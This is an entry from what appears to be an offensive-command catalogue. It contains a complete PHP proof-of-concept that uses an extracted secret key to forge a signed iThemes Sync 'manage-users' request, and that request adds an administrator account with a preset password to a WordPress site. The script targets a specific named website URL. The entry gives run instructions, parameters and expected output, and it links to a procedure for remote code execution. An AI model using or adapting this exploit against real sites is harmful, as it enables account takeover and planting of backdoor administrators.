---
id: cmd-php-poc-007
data: >-
  <?php // fill in these two, run from command line: php this_script.php
  $user_id='123'; $key='(KEY HERE)'; $action='manage-users'; $newuser=array();
  $newuser[0]=array(); $newuser[0][0]=array();
  $newuser[0][0]['user_login']='newuser'; $newuser[0][0]['user_pass']='newpass';
  $newuser[0][0]['user_email']='foo@foo.com';
  $newuser[0][0]['role']='administrator'; $args=array(); $args['add']=$newuser;
  $salt='A';
  $hash=hash('sha256',$user_id.$action.json_encode($args).$key.$salt);
  $req=array(); $req['action']=$action; $req['arguments']=$args;
  $req['user_id']=$user_id; $req['salt']=$salt; $req['hash']=$hash;
  $data='request='.json_encode($req); echo("sending: $data\n"); $c=curl_init();
  curl_setopt($c,CURLOPT_URL,'https://www.drivegrab.com/?ithemes-sync-request=1');
  curl_setopt($c,CURLOPT_POSTFIELDS,$data); $res=curl_exec($c); echo("response:
  ".json_encode($res)."\n"); ?>
tags:
  - rce
type: command
output: null
executor: php
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.977Z'
verified: false
validated: true
submitted: true
---
# php-rce-poc-script

## Command

```php
<?php // full script as above ?>
```

## Description

PHP PoC to add admin user via iThemes-Sync using extracted key.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$user_id` | Extracted ID | Yes |
| `$key` | Plaintext key | Yes |
| `$action` | 'manage-users' | Yes |

## Examples

### Basic Usage

Save as script.php and run: php script.php

## Expected Output

Echoed request and JSON response confirming addition.

## Related

- [[Related Procedure: Achieve-RCE-via-iThemes-Sync-Bypass]]
